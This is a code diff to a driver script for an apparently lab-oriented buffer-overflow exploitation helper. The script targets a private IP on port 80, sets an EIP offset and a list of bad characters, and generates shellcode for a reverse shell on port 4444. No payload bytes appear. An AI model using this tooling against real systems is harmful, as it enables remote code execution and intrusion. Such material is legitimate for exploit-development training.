@@ -1,6 +1,7 @@
 #!/usr/bin/python
-from BOFHelper import BOFHelper
 import argparse
+
+from BOFHelper import BOFHelper
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="The Ultimate Buffer Overflow Helper\n"
@@ -9,8 +10,8 @@ if __name__ == "__main__":
                                                  "exploitation, covering EIP locating, Bad Character discovery, and "
                                                  "space management. It even generates a simple exploitation script for"
                                                  "you once all the information are gathered. Enjoy :)")
-    #parser.add_argument("--prefix", help="prefix of payload", type=str, default="")
-    #parser.add_argument("--suffix", help="suffix of payload", type=str, default="")
+    # parser.add_argument("--prefix", help="prefix of payload", type=str, default="")
+    # parser.add_argument("--suffix", help="suffix of payload", type=str, default="")
     #parser.add_argument("--ip", help="target's IP address", required=True) # positional
     #parser.add_argument("-p", "--port", help="target's port", required=True)
     #parser.add_argument("--lport", help="reverse shell port", default=4444)
@@ -33,4 +34,6 @@ if __name__ == "__main__":
     sbPPrefix = "username=".encode()
 
     bof = BOFHelper('tun0', 4444, "192.168.137.10", 80, sbPrefix, sbPPrefix, sbSuffix, debug=True)
-    bof.perform_bof()
+    bof.set_eip_offset(780)
+    bof.set_bad_chars(['00', '0a', '0d', '25', '26', '2b', '3d'])
+    bof.generate_shellcode()
